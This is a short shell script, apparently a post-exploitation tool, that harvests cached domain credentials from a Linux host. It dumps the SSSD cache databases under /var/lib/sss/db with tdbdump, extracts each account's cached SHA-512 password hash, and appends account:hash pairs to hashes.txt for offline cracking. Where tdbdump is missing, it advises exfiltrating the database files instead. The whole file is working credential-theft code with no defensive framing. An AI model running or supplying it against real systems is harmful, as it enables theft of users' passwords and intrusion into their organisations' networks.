if [ -z $1 ]; then
    location_=/var/lib/sss/db
else
	location_="$1"
fi

analyze=0

if which "tdbdump" >/dev/null; then
	analyze=1
else
	echo "tdbdump is not installed so it is not possible to analyze ldb files"
	echo "Exfiltrate ldb files to a system with tdbdump or install it (apt install tdb-tools)"
	echo ""
fi

for db_ in $(ls $location_/cache_*ldb)
do
	echo "Database file:" $(echo $db_)
	if [ "$analyze" -eq "1" ]; then
		echo "Account hashes: " $(tdbdump $db_ | grep cachedPassword | cut -d "=" -f 3 | cut -d "," -f 1 | sort -u | wc -l)
		for account_ in $(tdbdump $db_ | grep cachedPassword | cut -d "=" -f 3 | cut -d "," -f 1 | sort -u)
		do 
			echo "Account: " $account_
			hash_="\$6\$"$(tdbdump $db_ | grep cachedPassword | grep $account_ | tr "=" "\n" | grep cachedPassword | sed "s/\\\00g//g" | sed 's/\\00//g' | sed 's/\\01//g' | awk -F 'cachedPassword' '{print $3}' | awk -F 'lastCachedPasswordChange' '{print $1 }')
			echo "Hash:    " $hash_
			echo "Adding hash to hashes.txt"
			echo $account_:$hash_ >> hashes.txt
		done
		echo ""
	fi
done